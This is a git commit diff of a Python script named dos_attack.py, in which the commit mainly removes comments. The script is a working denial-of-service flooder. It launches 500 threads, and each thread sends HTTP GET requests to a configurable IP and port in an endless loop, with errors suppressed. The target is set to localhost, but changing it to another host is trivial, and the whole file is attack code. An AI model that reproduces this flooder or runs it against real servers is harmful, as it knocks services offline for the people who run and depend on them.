4df7025d3acbf34da000ba295ec4168e71877965
pulagumsaii <155514623+pulagumsaii@users.noreply.github.com>
2025-03-05 20:26:39 +0530

    dos_attack.py

--- dos_attack.py
+++ dos_attack.py
@@ -1,24 +1,22 @@
 import socket
 import threading
 
-# Target server details
-TARGET = "127.0.0.1"  # Change this to the IP of your target
-PORT = 8080  # Change to match your test server
 
-# Function to send requests
+TARGET = "127.0.0.1"  
+PORT = 8080  
+
+
 def attack():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((TARGET, PORT))
         while True:
-            s.send(b"GET / HTTP/1.1\r\nHost: TARGET\r\n\r\n")  # Keep sending requests
+            s.send(b"GET / HTTP/1.1\r\nHost: TARGET\r\n\r\n")  
     except:
         pass
- # Ignore errors
 
-# Launch multiple attack threads
-for _ in range(500):  # 100 concurrent threads
+for _ in range(500):
     thread = threading.Thread(target=attack)
     thread.start()
 
-print("Attack Started...")  # Notify user
+print("Attack Started...")
